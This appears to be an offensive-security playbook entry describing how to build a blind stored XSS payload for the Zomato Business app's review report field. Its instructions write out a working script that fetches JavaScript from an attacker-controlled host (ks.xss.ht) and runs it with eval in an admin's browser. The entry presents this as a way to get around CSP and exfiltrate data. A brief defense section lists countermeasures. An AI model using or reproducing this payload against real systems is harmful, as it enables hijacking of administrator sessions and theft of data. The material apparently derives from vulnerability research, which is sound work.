---
tags:
  - xss
  - payload-craft
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/construct-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:07.336Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 7ecf0adb-2539-4800-a391-a0d5335bb189
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-XSS-Payload-for-Review-Report

## Summary

This procedure crafts a blind stored XSS payload designed for injection into the Zomato Business app's review report additional_text field. The payload uses XMLHttpRequest to load and evaluate external JavaScript, bypassing CSP restrictions enabled by unsafe-inline policies.

## Description

In the context of the Zomato vulnerability, the additional_text field is stored without sanitization and rendered as HTML on the admin panel at /reviews_new?review_id={ID}. The payload targets this by defining a load event handler to eval fetched content from an attacker-controlled domain (e.g., ks.xss.ht), allowing arbitrary code execution in the admin's browser. Prerequisites include a valid review ID and understanding of the target's CSP (which permits unsafe-inline, enabling the XHR approach). Expected outcome: A functional payload that executes silently upon admin view, facilitating data exfiltration via AJAX.

## Requirements

1. Valid Zomato access token for request preparation
2. Attacker-controlled external domain for JS hosting (e.g., ks.xss.ht)
3. Burp Suite or similar proxy for payload testing

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization/escaping for all user inputs rendered as HTML (e.g., use DOMPurify)
- Enforce strict CSP without unsafe-inline; use nonce or hash-based script sources
- Monitor for anomalous XHR requests to external domains from admin panels
- Log and alert on report submissions with script-like content

## Objectives

1. Create a CSP-bypassing XSS payload for stored injection
2. Ensure payload compatibility with admin panel rendering
3. Enable external JS loading for further exploitation

## Instructions

### Step 1: Define the Core Payload Function

**Context**: Build the JavaScript that handles response evaluation to avoid direct inline script blocks.

**Command** ([[commands/construct-xss-payload]]):
```bash
echo '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>' > xss_payload.txt
```

> This command outputs the payload to a file. The function b() evals the response, a is the XHR instance listening for load, opening a GET to the external URL, and sending it. Expected output: A text file with the exact payload string.

### Step 2: Validate Payload Syntax

**Context**: Test the payload in a local HTML file or console to ensure no syntax errors.

**Command** ([[commands/construct-xss-payload]]):
```bash
# Paste into browser console or local test.html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

> Run in a browser with dev tools open. Expected output: Network request to ks.xss.ht without errors; console shows eval execution if JS is present on the domain.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/construct-xss-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- payload-craft
